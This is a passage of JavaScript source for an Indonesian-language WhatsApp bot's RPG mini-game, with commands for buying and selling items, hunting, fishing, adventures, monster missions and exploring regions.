 if (isMonay < noh) return newReply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Potion* : ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return newReply(`Example : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return newReply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Bait Food* : ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return newReply(`Example : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return newReply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( async() => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { 
 newReply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)}
 }
 break
case 'sell': case 'sel': case 'jual':{
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
 if (!text) return newReply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return newReply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa Ikan Fish : ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return newReply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
 newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return newReply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return newReply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa domba* : ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return newReply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa sapi* : ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return newReply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa gajah* : ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return newReply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa besi* : ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return newReply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa emas* : ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return newReply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return newReply(`Example : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
newReply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
}, 2000) 
 } else { 
newReply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
 }

 }
 break
case 'heal':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!isCekDarah < 1) return newReply('Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0')
if (isCekDarah > 100) return newReply('Darahmu Penuh')
if (isPotion < 1) return newReply(`Anda Tidak Punya Ramuan, Coba Beli Dengan Cara #buypotion _amount_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 newReply('Done! Darah mu dah full')
 }
 break
case 'hunt': case 'hunting': {
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return newReply('Darahmu Habis, Coba Sembuhkan Menggunakan Ramuan') 
let luka = ["Pierced by a thorn while hunting","Slipped into the abyss while hunting","Scratched by a wild animal","Not careful","Entangled in roots","Fall while hunting"]
let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Jungle') {
var image = 'https://telegra.ph/file/92967f55b1f437fdd55fe.jpg'
} else
if (lokasinya === 'Amazon forest') {
var image = 'https://telegra.ph/file/2b9b53837d9f109862224.jpg'
} else
if (lokasinya === 'Tropical forest') {
var image = 'https://telegra.ph/file/bd662563855328a1832e6.jpg'
} else
if (lokasinya === 'Meadow') {
var image = 'https://telegra.ph/file/66435cf783e308b19927e.jpg'
} else
if (lokasinya === 'African forest') {
var image = 'https://telegra.ph/file/c5996d581846f70ed1514.jpg'
} else
if (lokasinya === 'Mountains') {
var image = 'https://telegra.ph/file/ca8f84d91ca3e1d5efa59.jpg'
}
 setTimeout( async () => {
let teksehmazeh = `_HUNT RESULT_\n\n`
 teksehmazeh += `*🐟Fish* : ${ikanmu}\n`
 teksehmazeh += `*🐔Chicken* : ${ayam}\n`
 teksehmazeh += `*🐇Rabbit* : ${kelinci}\n`
 teksehmazeh += `*🐑Sheep* : ${domba}\n`
 teksehmazeh += `*🐄Cow* : ${sapi}\n`
 teksehmazeh += `*🐘Elephant* : ${gajah}\n\n`
 teksehmazeh += `_INFO_\n`
 teksehmazeh += `*Location* : ${lokasinya}\n`
 teksehmazeh += `*Wounded* : ${lukanya}, blood - 10\n`
 teksehmazeh += `*Remaining blood* : ${getDarah(m.sender)}\n`
await Aira.sendMessage(m.chat, {image:{ url: image }, caption: teksehmazeh}, {quoted: m})
}, 5000)
 setTimeout( () => {
Aira.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`, m) 
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
case 'adventure':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ngab = ['Avalanche','Volcanic Eruption','Tsunami','Earthquake','Meteor','Demon']
var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
var sesuatuu = dungeon[Math.floor(Math.random() * dungeon.length)]
hasm = "https://telegra.ph/file/ff94536d69e0f4f3e7b54.jpg"
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `「 DEATH 」\n\n *┊ Place* ${sesuatuu}\n ┊ *MONEY :* $${money}\n ┊ *EXP :* ${adven}Xp`
Aira.sendMessage(m.chat, {image:{url:hasm}, caption: hg},{quoted:m})

}, 7000)
setTimeout( () => {
newReply(`Awass`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
newReply(`Tiba-tiba Ada ${sesuatu}`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
newReply(`${pushname} On an Adventure`)
}, 0) // 1000 = 1s,
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'ojek': case 'ngojek':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `
*—[ Hasil Ngojek ${pushname} ]—*
 ➕ 💹 Uang = [ ${money} ]
 ➕ ✨ Exp = [ ${adven} ]	 
 ➕ 😍 Order Selesai = +1
`
newReply(hg)

}, 10000)
setTimeout( () => {
newReply(`
➕ 💹Menerima gaji....
`)
}, 9000)
setTimeout( () => {
newReply(`
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Sampai di tujuan...
`)
}, 7000)
setTimeout( () => {
newReply(`
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Mengantar ke tujuan....
`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
newReply(`
Mendapatkan Orderan...
`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
newReply(`Mencari Pelanggan...`)
}, 0) // 1000 = 1s,
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'luckyday':
case 'luckytime':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 450)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
addBalance(m.sender, b, balance)
addLevelingXp(m.sender, ez)
addEmas(m.sender, a)
addBesi(m.sender, c)
newReply(`🎰 *Lucky*\n┊ *Money:* $${b}\n┊ *Gold :* ${a}\n┊ *Iron :* ${c}\n┊ *XP :* ${ez}`)
}
break
case 'slime':
case 'killslime':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 400)
addLevelingXp(m.sender, ez)
a = randomNomor(55)
b = randomNomor(400)
c = randomNomor(80)
d = randomNomor(3)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufutI = "https://telegra.ph/file/c34a444fa8824d8bb6e18.jpg"
var hg = `*Misi kill Slime*\n\n🎁 *Hadiah untuk killing Slime*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
Aira.sendMessage(m.chat, {image:{url:bufutI},caption: hg} , {quoted:m}) 
}
break
case 'goblin':
case 'killgoblin':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 500)
addLevelingXp(m.sender, ez)
a = randomNomor(65)
b = randomNomor(500)
c = randomNomor(90)
d = randomNomor(5)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufo = "https://telegra.ph/file/19bdc38aaafda29f7afe1.jpg"
var hg = `*Misi kill Goblin*\n\n🎁 *Hadiah untuk killing Goblin*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
Aira.sendMessage(m.chat, {image:{url:bufo}, caption: hg }, {quoted:m})
}
break
case 'devil':
case 'killdevil':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 600)
addLevelingXp(m.sender, ez)
a = randomNomor(70)
b = randomNomor(600)
c = randomNomor(95)
d = randomNomor(6)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufas = "https://telegra.ph/file/dbecd2f871988f52bf555.jpg"
var hg = `*Misi kill Devil*\n\n🎁 *Hadiah untuk killing Devil*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
Aira.sendMessage(m.chat, {image:{url: bufas}, caption: hg }, {quoted:m})
}
break
case 'behemoth':
case 'killbehemoth':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 700)
addLevelingXp(m.sender, ez)
a = randomNomor(75)
b = randomNomor(600)
c = randomNomor(100)
d = randomNomor(7)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
batai = "https://telegra.ph/file/43259a7d8accff8b627c0.jpg"
var hg = `*Misi kill Behemoth*\n\n🎁 *Hadiah untuk kiling Behemoth*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
Aira.sendMessage(m.chat, {image:{url: batai}, caption: hg }, {quoted:m})
}
break
case 'demon':
case 'killdemon':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 850)
addLevelingXp(m.sender, ez)
a = randomNomor(90)
b = randomNomor(900)
c = randomNomor(120)
d = randomNomor(10)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bhuu = "https://telegra.ph/file/4a264a10ea2e5f18314f1.jpg"
var hg = `*Misi kill Demon*\n🎁 *Demon Kill Reward*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold*: ${a}\n ┊ *Diamond:* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
Aira.sendMessage(m.chat, {image: {url: bhuu}, caption: hg }, {quoted:m})
}
break
case 'demonking':
case 'killdemonking':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 1000)
addLevelingXp(m.sender, ez)
addBalance(m.sender, 1999, balance)
addEmas(m.sender, 99)
addBesi(m.sender, 99)
addDm(m.sender, 99)
bhuud = "https://telegra.ph/file/cdf482a8de192189057d8.jpg"
var hg = `*Misi kill DemonKing*\n\n🎁 *DemonKing Kill Reward*\n ┊ *Money* : $${b}\n ┊ *Iron :* ${c}\n ┊ *Gold :* ${a}\n ┊ *Diamond :* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
Aira.sendMessage(m.chat, {image:{url: bhuud}, caption: hg }, {quoted:m})
}
break
case 'joinrpg':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (isPetualang) return newReply(' *Kamu Telah join sebelumnya*')
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
_petualang.push(m.sender)
addInventoriDarah(m.sender, DarahAwal)
addInventori(m.sender)
addInventoriBuruan(m.sender)
fs.writeFileSync('./database/user/inventory.json', JSON.stringify(_petualang))
addLevelingId(m.sender) 
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
Aira.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break
case 'sellikan':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return newReply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 5 * jmlh
if (getFish(m.sender) < jmlh) return newReply(`*Ikan Anda Tidak Cukup*`)
sellFish(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
newReply(`🛍️ *MARKET*\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Price/Fish : 5\n ┊ Status : Success\n ┊ Left FishPrice/Fish : ${await getFish(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellbesi':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return newReply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 10 * jmlh
if (getBesi(m.sender) < jmlh) return newReply(`Besi Tidak Cukup`)
sellBesi(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
newReply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Besi : 10\n ┊ Status : Sukses\n ┊ Sisa Besi : ${await getBesi(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellemas':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return newReply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 25 * jmlh
if (getEmas(m.sender) < jmlh) return newReply(`Emas Anda Tidak Cukup`)
sellEmas(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
newReply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Emas : 25\n ┊ Status : Sukses\n ┊ Sisa Emas : ${getEmas(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break 
case 'jelajah': {
var tempsa = args.join(" ")
if (tempsa == 'corbiens river') {
var asu = `https://telegra.ph/file/00018dab77a6cea81523e.jpg`
setTimeout( async () => {
const vio = Math.ceil(Math.random() * 70) 
const pikan = Math.ceil(Math.random() * 15)
addStone(m.sender, vio)
addIkan(m.sender, pikan)
Aira.sendMessage(m.chat, {image:{url: asu}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${vio}* batu dan *${pikan}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) 

} else if (tempsa === 'chiltawa woods') {
let gos = `https://telegra.ph/file/77c3badc9f97d6589a30f.jpg`
setTimeout( async () => {
const tesaaq = Math.ceil(Math.random() * 110) // batu
const ise = Math.ceil(Math.random() * 20)
addStone(m.sender, tesaaq)
addKayu(m.sender, ise)
Aira.sendMessage(m.chat, {image:{url:gos},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tesaaq}* batu dan *${ise}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'cochher sea') { 
let seae = `https://telegra.ph/file/eabfc907cfc447386b0c0.jpg`
setTimeout( async () => {
const feds = Math.ceil(Math.random() * 65)
addIkan(m.sender, feds)
Aira.sendMessage(m.chat, {image:{url: seae},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${feds}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'limingstall mountains') {
let seoe = `https://telegra.ph/file/19a10ff95c31af10267e4.jpg`
setTimeout(() => {
const fads = Math.ceil(Math.random() * 50)
const fids = Math.ceil(Math.random() * 80)
addOre(m.sender, fads)
addStone(m.sender, fids)
Aira.sendMessage(m.chat, {image:{url:seoe}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${fads}* copper ore dan ${fids} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'chade mountain') {
let seye = `https://telegra.ph/file/efdcd7d07dd22294695a8.jpg`
setTimeout( () => {
const pore = Math.ceil(Math.random() * 40)
const pone = Math.ceil(Math.random() * 60)
addOre(m.sender, pore)
addStone(m.sender, pone)
Aira.sendMessage(m.chat, {image:{url:seye}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${pore}* copper ore dan ${pone} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 3000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'gerbil woods') {
let siae = `https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg`
setTimeout( async () => {
const tzys = Math.ceil(Math.random() * 90) // batu
const isue = Math.ceil(Math.random() * 45)
addStone(m.sender, tzys)
addKayu(m.sender, isue)
Aira.sendMessage(m.chat, {image:{url:siae}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tzys}* batu dan *${isue}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'moobiens grassland') {
let bbbb = `https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg`
setTimeout( () => {
const awqu = Math.ceil(Math.random() * 200) // batu
const usui = Math.ceil(Math.random() * 20)
addStone(m.sender, awqu)
addKayu(m.sender, usui)
Aira.sendMessage(m.chat, {image:{url:bbbb}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${awqu}* batu dan ${usui} kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`} ,{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
newReply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else {
let seae = await getBuffer(`https://telegra.ph/file/16857796fab2ccb6cffc2.jpg`)
tesk = `*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*


⚪ Corbiens River
🔵 Cochher Sea
⚫ Moobiens Grassland
🟣 Gerbil Woods
🟢 Chiltawa Woods
🟠 Limingstall Mountains
🔴 Chade Mountain

Example :
- ${prefix}jelajah corbiens river
`
Aira.sendMessage(m.chat, { image: seae, caption: tesk}, {quoted: m}) 
}
}
break
case 'mancing':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
setTimeout( () => {
const fishing = Math.ceil(Math.random() * 10)
addIkan(m.sender, fishing)
newReply(`*Congratulation 🎊*\n\n kamu mendapatkan *${fishing}* Ikan selama 2 menit`)
}, 6000); //2 minute
setTimeout( () => {
newReply('Berhasil Mendapatkan Ikan . . .' )
}, 4000) // 1000 = 1s,
setTimeout( () => {
newReply('🎣 Menarik Kail. . .' )
}, 3000) // 1000 = 1s,
setTimeout( () => {
newReply('🎣 Mulai Memancing . . .')
}, 0) // 1000 = 1s,
}
break
case 'jualikan':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIkan = 10000
const hasil1 = bayar * hargaIkan
